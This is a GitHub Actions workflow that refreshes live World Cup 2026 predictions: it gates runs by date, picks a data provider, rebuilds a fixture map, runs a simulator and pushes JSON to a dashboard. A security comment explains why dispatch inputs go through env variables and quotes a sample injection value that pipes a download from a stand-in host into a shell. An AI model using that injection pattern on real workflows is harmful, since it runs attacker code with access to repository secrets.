name: Live matchday refresh

# Polls every 10 minutes during the tournament window (11 Jun → 19 Jul 2026).
# The orchestrator exits fast if no match has changed to a final state —
# only re-simulates when something genuinely happened.
#
# Provider selection:
#   - Set repo VARIABLE `FOOTBALL_PROVIDER` to `api_football` (or leave unset for mock)
#   - Add repo SECRET `API_FOOTBALL_KEY` for API-Football
#   - (Optional) Add repo SECRET `FOOTBALL_DATA_TOKEN` if using football-data.org
#   - (Optional) Add repo SECRET `SPORTMONKS_TOKEN` if using Sportmonks
# Without a provider key the orchestrator silently falls back to manual/mock mode.
#
# NOTE on the FOOTBALL_DATA_TOKEN / SPORTMONKS_TOKEN env vars further below:
# both are referenced as workflow-level secret refs even when the repo doesn't
# have those secrets configured. This is INTENTIONAL — the env value resolves
# to "" and run_live_update.py:detect_provider_source only activates those
# providers when the user explicitly selects them via FOOTBALL_PROVIDER AND
# the corresponding token exists. The pre_flight gate at scripts/pre_flight.py
# also REQUIRES these to remain secret-refs (not literals) for security
# hygiene — don't delete them, even if the repo never plans to configure
# Sportmonks or football-data.org. Leaving them in keeps the multi-provider
# fallback path operational the moment a user adds the secrets.
on:
  # Cloudflare Worker dispatches this workflow every 10 min via the GitHub
  # API. It's the reliable primary scheduler.
  #
  # GitHub Actions' native `schedule:` was removed: it ran at the same
  # cadence as the CF Worker, doubled the run rate during live matches,
  # and is load-shed during peak hours anyway. The CF Worker is more
  # reliable AND deduplicates implicitly (single dispatcher).
  #
  # If the CF Worker goes down for an extended period, re-add a
  # `*/30 * * * *` schedule here as a sparse safety net — but the
  # Worker's free tier easily covers the tournament.
  workflow_dispatch:
    inputs:
      provider:
        description: 'Override provider for this manual run (mock|api_football|sportmonks)'
        required: false
        default: ''
      dry_run:
        description: 'Dry-run only (no write, no commit)'
        type: boolean
        required: false
        default: false

concurrency:
  group: wc26-live
  cancel-in-progress: false   # let any in-flight rerun finish

# Wall-clock risk zone (Round 14 audit observation, 2026-06-13):
# 9/29 recent runs landed in the 540-588s band — within 60s of the 600s
# CF Worker dispatch interval. timeout-minutes is 15 (900s) so no hard
# failure, but a run >600s means the next dispatched run queues behind
# this one (cancel-in-progress: false) and the dashboard misses the
# 10-min update tick. The 388s baseline floor is the heavy step:
# scripts/03_simulate.py at 5000×5. If runs trend higher, options:
#   - drop --sims for live runs (3000 keeps spread < 3pp empirically)
#   - move heavy validate/sensitivity steps to daily-baseline only
#   - relax CF dispatch to 15-min during knockout (fewer matches)
# Monitor: GHA UI "live-matchday" job duration column. No code change
# warranted today — the median is ~400s and the trend is flat.

# GITHUB_TOKEN is read-only by default on repos created after 2023.
# We need contents:write so the bot can push the live JSON updates.
permissions:
  contents: write

jobs:
  live:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v6
        with:
          fetch-depth: 1

      - uses: actions/setup-python@v6
        with:
          python-version: '3.12'
          cache: 'pip'

      - run: pip install -r requirements.txt

      - name: Date gate (skip if outside tournament window)
        id: gate
        run: |
          # Manual dispatches always run — used for pre-tournament smoke tests.
          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
            echo "skip=false" >> $GITHUB_OUTPUT
            echo "Manual dispatch — bypassing date gate."
            exit 0
          fi
          NOW=$(date -u +%s)
          # Start 24h early so the first kickoff is already covered by an active loop.
          START=$(date -u -d '2026-06-10 00:00:00' +%s 2>/dev/null || python -c "import datetime;print(int(datetime.datetime(2026,6,10).timestamp()))")
          END=$(date -u -d '2026-07-20 00:00:00' +%s 2>/dev/null || python -c "import datetime;print(int(datetime.datetime(2026,7,20).timestamp()))")
          if [ $NOW -lt $START ] || [ $NOW -gt $END ]; then
            echo "skip=true" >> $GITHUB_OUTPUT
            echo "Outside tournament window — exiting."
          else
            echo "skip=false" >> $GITHUB_OUTPUT
          fi

      - name: Resolve provider for this run
        id: provider
        # SECURITY: github.event.inputs.* values are passed through `env:` not
        # interpolated into the shell script. Direct interpolation would let
        # anyone with write access to the repo run arbitrary code on the runner
        # (and therefore access API_FOOTBALL_KEY, VERCEL_TOKEN, etc.) by
        # dispatching with a value like `mock"; curl evil | sh; #`.
        env:
          INPUT_PROVIDER: ${{ github.event.inputs.provider }}
          VAR_FOOTBALL_PROVIDER: ${{ vars.FOOTBALL_PROVIDER }}
          VAR_WC_RESULTS_SOURCE: ${{ vars.WC_RESULTS_SOURCE }}
        run: |
          PROVIDER="$INPUT_PROVIDER"
          if [ -z "$PROVIDER" ]; then PROVIDER="$VAR_FOOTBALL_PROVIDER"; fi
          if [ -z "$PROVIDER" ]; then PROVIDER="$VAR_WC_RESULTS_SOURCE"; fi
          if [ -z "$PROVIDER" ]; then PROVIDER="mock"; fi
          # Defensive whitelist — only known providers allowed downstream.
          case "$PROVIDER" in
            mock|api_football|football_data|sportmonks) : ;;
            *) echo "Refusing unknown provider: $PROVIDER" >&2; exit 1 ;;
          esac
          echo "provider=$PROVIDER" >> "$GITHUB_OUTPUT"
          echo "Provider for this run: $PROVIDER"

      - name: Rebuild fixture map (provider switch OR knockout draw resolved)
        if: steps.gate.outputs.skip != 'true'
        env:
          API_FOOTBALL_KEY:  ${{ secrets.API_FOOTBALL_KEY }}
          FOOTBALL_DATA_TOKEN: ${{ secrets.FOOTBALL_DATA_TOKEN }}
          PROVIDER: ${{ steps.provider.outputs.provider }}
        run: |
          set +e
          MAP=data/live/provider_fixture_map.json
          # ── Trigger 1: provider switched (e.g. football_data → api_football)
          CURRENT_PROVIDER=$(jq -r '.provider // ""' "$MAP" 2>/dev/null || echo "")
          PROVIDER_MISMATCH="no"
          if [ "$CURRENT_PROVIDER" != "$PROVIDER" ]; then
            PROVIDER_MISMATCH="yes"
          fi
          # ── Trigger 2 (A.5): knockout draw has resolved — the map only has
          # group fixtures and the live state indicates the group stage is
          # finishing (>= 48 matches locked, i.e. matchday 3 well underway).
          # Rebuild proactively so M73-M104 get mapped before R32 kicks off.
          KNOCKOUT_MAPPED=$(jq -r '.coverage.knockout_mapped // 0' "$MAP" 2>/dev/null || echo "0")
          KNOCKOUT_TOTAL=$(jq -r '.coverage.knockout_total // 0' "$MAP" 2>/dev/null || echo "0")
          COMPLETED=$(jq -r '.completed_matches_count // 0' dashboard/live_state.json 2>/dev/null || echo "0")
          KNOCKOUT_NEEDED="no"
          if [ "$KNOCKOUT_MAPPED" -lt "$KNOCKOUT_TOTAL" ] && [ "$COMPLETED" -ge 48 ]; then
            KNOCKOUT_NEEDED="yes"
          fi

          if [ "$PROVIDER_MISMATCH" = "no" ] && [ "$KNOCKOUT_NEEDED" = "no" ]; then
            echo "Fixture map up-to-date "
            echo "  provider: have='$CURRENT_PROVIDER' want='$PROVIDER' (match)"
            echo "  knockout: $KNOCKOUT_MAPPED/$KNOCKOUT_TOTAL mapped, $COMPLETED group matches locked"
            exit 0
          fi

          echo "Rebuilding fixture map:"
          [ "$PROVIDER_MISMATCH" = "yes" ] && echo "  reason: provider mismatch (have='$CURRENT_PROVIDER' want='$PROVIDER')"
          [ "$KNOCKOUT_NEEDED" = "yes" ] && echo "  reason: knockout draw should be resolvable ($COMPLETED matches locked, $KNOCKOUT_MAPPED/$KNOCKOUT_TOTAL knockouts mapped)"

          # Back up the current map so we can roll back if rebuild yields fewer group fixtures.
          if [ -f "$MAP" ]; then cp "$MAP" "${MAP}.bak"; fi
          python scripts/live/build_provider_fixture_map.py \
            --provider "$PROVIDER" --season 2026 --league-id 1 --write
          RC=$?
          # Sanity-check the new map didn't regress group coverage. If it did,
          # restore the backup — the old map is strictly better than a broken
          # new one.
          NEW_GROUP=$(jq -r '.coverage.group_mapped // 0' "$MAP" 2>/dev/null || echo "0")
          OLD_GROUP=$(jq -r '.coverage.group_mapped // 0' "${MAP}.bak" 2>/dev/null || echo "0")
          if [ $RC -ne 0 ] || { [ "$NEW_GROUP" -lt "$OLD_GROUP" ] && [ -f "${MAP}.bak" ]; }; then
            echo "Rebuild failed or regressed group coverage ($OLD_GROUP → $NEW_GROUP) — restoring previous map."
            [ -f "${MAP}.bak" ] && mv "${MAP}.bak" "$MAP"
          else
            rm -f "${MAP}.bak"
            NEW_KNOCKOUT=$(jq -r '.coverage.knockout_mapped // 0' "$MAP" 2>/dev/null || echo "0")
            echo "Rebuild OK: $NEW_GROUP group + $NEW_KNOCKOUT knockout = $((NEW_GROUP + NEW_KNOCKOUT)) fixtures mapped"
          fi
          exit 0

      - name: Run live update orchestrator
        if: steps.gate.outputs.skip != 'true'
        env:
          FOOTBALL_PROVIDER: ${{ steps.provider.outputs.provider }}
          # Backward-compatible alias — orchestrator reads either name
          WC_RESULTS_SOURCE: ${{ steps.provider.outputs.provider }}
          API_FOOTBALL_KEY:  ${{ secrets.API_FOOTBALL_KEY }}
          WC_APIFOOTBALL_KEY: ${{ secrets.API_FOOTBALL_KEY }}
          FOOTBALL_DATA_TOKEN: ${{ secrets.FOOTBALL_DATA_TOKEN }}
          WC_FOOTBALL_DATA_TOKEN: ${{ secrets.FOOTBALL_DATA_TOKEN }}
          SPORTMONKS_TOKEN: ${{ secrets.SPORTMONKS_TOKEN }}
          WC_SPORTMONKS_TOKEN: ${{ secrets.SPORTMONKS_TOKEN }}
          # Fallback defaults — see matchday-intel-slow.yml for context.
          API_FOOTBALL_LEAGUE_ID: ${{ vars.API_FOOTBALL_LEAGUE_ID || '1' }}
          API_FOOTBALL_SEASON: ${{ vars.API_FOOTBALL_SEASON || '2026' }}
          FOOTBALL_DATA_COMPETITION: ${{ vars.FOOTBALL_DATA_COMPETITION }}
          # SECURITY: dispatch input goes through env, never shell-interpolated.
          INPUT_DRY_RUN: ${{ github.event.inputs.dry_run }}
        run: |
          # IMPORTANT: GHA's default shell is `bash --noprofile --norc -eo
          # pipefail {0}`, so `cmd; rc=$?` aborts on cmd's non-zero exit
          # before rc=$? runs. `cmd || rc=$?` puts cmd in a conditional
          # context which suppresses -e, so rc is always captured. Then we
          # default rc=0 for the success path (|| doesn't fire on rc=0).
          rc=0
          if [ "$INPUT_DRY_RUN" = "true" ]; then
            python scripts/live/run_live_update.py --dry-run || rc=$?
          else
            python scripts/live/run_live_update.py || rc=$?
          fi
          # rc=2 is the orchestrator's "soft skip" — input corruption, missing
          # model artifacts, or circuit-breaker tripped. In every rc=2 path,
          # run_live_update has ALREADY written live_state.json with a typed
          # warning describing the reason. We want that warning to reach the
          # dashboard, so convert to exit 0 here; the commit/push step below
          # will then ship the warning. Anything else (rc=0 success, rc=1
          # sim crash, rc=other) bubbles up unchanged.
          if [ "$rc" -eq 2 ]; then
            echo "::warning::run_live_update returned 2 (soft skip) — live_state.json warning will be published this tick."
            exit 0
          fi
          exit "$rc"

      - name: Commit updated JSON (if changed)
        if: steps.gate.outputs.skip != 'true' && github.event.inputs.dry_run != 'true'
        env:
          INPUT_DRY_RUN: ${{ github.event.inputs.dry_run }}
        run: |
          set +e   # never let a non-zero exit here fail the whole tick
          git config user.name "wc26-bot"
          git config user.email "wc26-bot@users.noreply.github.com"
          # Explicit allow-list — skip gitignored files (circuit_breaker_state.json, etc.)
          git add dashboard/predictions.json \
                  dashboard/predictions_live.json \
                  dashboard/live_state.json \
                  dashboard/live_delta.json \
                  data/live/results_2026.json \
                  data/live/live_team_state.json \
                  data/live/provider_fixture_map.json 2>/dev/null
          if git diff --quiet --cached; then
            echo "No JSON changes to commit."
            exit 0
          fi
          # NO `[skip ci]` tag — Vercel treats it as "do not deploy", which is
          # the opposite of what we want. We need each live update to trigger
          # a Vercel rebuild so vercel.app serves the fresh JSON. The only
          # other workflow (daily-baseline.yml) is schedule-only, so there's
          # nothing here for `[skip ci]` to usefully skip.
          git commit -m "live: update results @ $(date -u +%Y-%m-%dT%H:%MZ)"
          # PUSH-RACE FIX: a manual dispatch firing during a scheduled cron
          # tick (or vice versa) can land out of order. Rebase the staged
          # commit on top of any new origin commits before pushing so the
          # second pusher doesn't 403 with non-fast-forward and silently
          # drop its update.
          #
          # --autostash is LOAD-BEARING: the simulator at 03_simulate.py:1217
          # writes data/processed/predictions_live.json (canonical output),
          # which run_live_update.py:506 then copies to dashboard/. The
          # canonical file in data/processed/ stays modified in the working
          # tree because it's not in the git-add allow-list above (we only
          # publish the dashboard/ copy). Without --autostash, `git pull
          # --rebase` refuses with "you have unstaged changes" and falls
          # through to the push, which then 403s if origin moved. Don't
          # remove the flag without first adding data/processed/*.json to
          # the allow-list.
          #
          # Main IS production for this repo — push back to main.
          BRANCH="main"
          git pull --rebase --autostash origin "$BRANCH" || echo "Rebase failed — pushing anyway."
          # Push failures previously fell through with `exit 0`, marking the
          # job green and silently freezing the dashboard. Surface the failure
          # so the next scheduled tick (and a human watching Actions) both see
          # it. The local commit is not preserved — next tick clones fresh
          # (fetch-depth: 1) — but recovery is automatic because each tick
          # re-fetches results from the provider (scripts/live/fetch_results.py
          # overwrites results_2026.json), the orchestrator re-derives the diff
          # from the refetched state, and re-stages an equivalent commit.
          # Recovery is deterministic *modulo provider idempotence*: FT/locked
          # matches don't un-lock, so the diff converges. The preservation
          # branch at fetch_results.py:765-770 also stops a transient empty
          # provider response from blowing away the previous committed JSON.
          if ! git push origin "HEAD:$BRANCH"; then
            echo "::error::git push to $BRANCH failed — dashboard not refreshed this tick. Next scheduled tick will retry."
            exit 1
          fi
          exit 0

      # Vercel deploy on commit happens automatically via the Git integration
      # connected to this repo. The previous CLI deploy step was removed
      # because it doubled every deploy (Git integration was already firing
      # on the same push), wasting Actions minutes + deploy budget.
